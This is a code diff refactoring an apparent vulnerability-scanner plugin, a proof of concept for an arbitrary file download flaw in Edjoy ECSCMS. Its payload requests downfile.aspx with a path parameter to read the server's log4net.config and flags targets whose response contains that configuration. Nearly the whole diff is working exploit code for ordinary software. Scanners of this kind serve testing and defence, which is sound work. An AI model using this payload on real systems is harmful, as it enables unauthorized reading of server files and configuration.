@@ -3,38 +3,27 @@
 
 __author__ = 'xiaokong'
 
-import sys
-import requests
-from module.log import logger
+from module.plugin import Plugin
 
+class poc(Plugin):
 
-description = 'Edjoy ECSCMS downfile.aspx download file'
-querytype = 'site'
-type = 'CMS'
-cmsname = 'edjoy'
-
-class poc(object):
+    type = 'CMS'
+    cmsname = 'edjoy'
+    querytype = 'site'
+    description = 'Edjoy ECSCMS downfile.aspx download file'
     
-    def __init__(self, v):
+    def __init__(self):
     
         self.payload = "/operationManage/downfile.aspx?name=test&path=log4net.config"
-        self.userAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)'
-        self.logger = logger(v)
     
     def exploit(self, target):
-        
-        headers = {'User-Agent': self.userAgent}
-        try:
-            
-            res = requests.get(target+self.payload, headers=headers, timeout=30)
-            if not res.ok:
-                return True
-            data = res.content
-            if '<log4net>' in data and '<?xml version="1.0" encoding="utf-8" ?>' in data:
-                self.logger.log(41,str([target]))
+
+        response = self.query(method='POST', url=target+self.payload)
+        if response:
+            if response.ok:
+                if '<log4net>' in response.content and '<?xml version="1.0" encoding="utf-8" ?>' in response.content:
+                    self.log.vuln(target)
                 
-        except Exception as e:
-            self.logger.debug(str(e))
     
 
    
